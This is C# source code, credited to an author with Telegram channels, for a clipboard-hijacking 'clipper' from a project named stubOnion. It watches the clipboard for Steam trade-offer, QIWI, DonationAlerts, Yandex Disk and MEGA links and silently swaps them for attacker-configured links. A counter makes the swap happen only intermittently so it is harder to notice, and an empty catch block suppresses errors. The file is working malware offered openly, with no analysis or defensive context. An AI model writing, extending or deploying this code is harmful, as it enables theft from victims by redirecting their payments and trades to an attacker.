/* 
    Author : Megavolt
	Telegram Group : t.me/DOLFX
    Github : github.com/Megavolt666
	Telegram Author : t.me/megavoltcoder
*/
using System;
using System.Windows.Forms;

namespace stubOnion
{
    class URLChanger
    {
        public static int _oppToMiss;
        public static void GetLinks()
        {
            try
            {
                var clpbrd = Clipboard.GetText();
                if (Clipboard.ContainsText())
                {
                    if (clpbrd.StartsWith("https://") || clpbrd.StartsWith("http://"))
                    {
                        if (clpbrd.Contains("steamcommunity.com/tradeoffer/new/"))
                        {
                            if (_oppToMiss > 0)
                            {
                                _oppToMiss--;
                                return;
                            }
                            _oppToMiss = Config.OppToMissDef;
                            Clipboard.SetText(Config.steam);
                        }
                        else
                        {
                         
                        }

                        if (clpbrd.Contains("qiwi.me/"))
                        {
                            if (_oppToMiss > 0)
                            {
                                _oppToMiss--;
                                return;
                            }
                            _oppToMiss = Config.OppToMissDef;
                            Clipboard.SetText(Config.qiwime);
                        }
                        else
                        {
                           
                        }

                        if (clpbrd.Contains("qiwi.com/n/"))
                        {
                            if (_oppToMiss > 0)
                            {
                                _oppToMiss--;
                                return;
                            }
                            _oppToMiss = Config.OppToMissDef;
                            Clipboard.SetText(Config.qiwinick);
                        }
                        else
                        {

                        }

                        if (clpbrd.Contains("donationalerts.com/r/"))
                        {
                            if (_oppToMiss > 0)
                            {
                                _oppToMiss--;
                                return;
                            }
                            _oppToMiss = Config.OppToMissDef;
                            Clipboard.SetText(Config.donat);
                        }
                        else
                        {
                         
                        }
                        if (clpbrd.Contains("yadi.sk/d/"))
                        {
                            if (_oppToMiss > 0)
                            {
                                _oppToMiss--;
                                return;
                            }
                            _oppToMiss = Config.OppToMissDef;
                            Clipboard.SetText(Config.ydisk);
                        }
                        else
                        {
                           
                        }
                        if (clpbrd.Contains("mega.nz/#"))
                        {
                            if (_oppToMiss > 0)
                            {
                                _oppToMiss--;
                                return;
                            }
                            _oppToMiss = Config.OppToMissDef;
                            Clipboard.SetText(Config.mega);
                        }
                        else
                        {
                          
                        }
                    }
                    else
                    {
                        return;
                    }
                }
                else
                {
                    return;
                }
            }
            catch { }
        }
    }
}
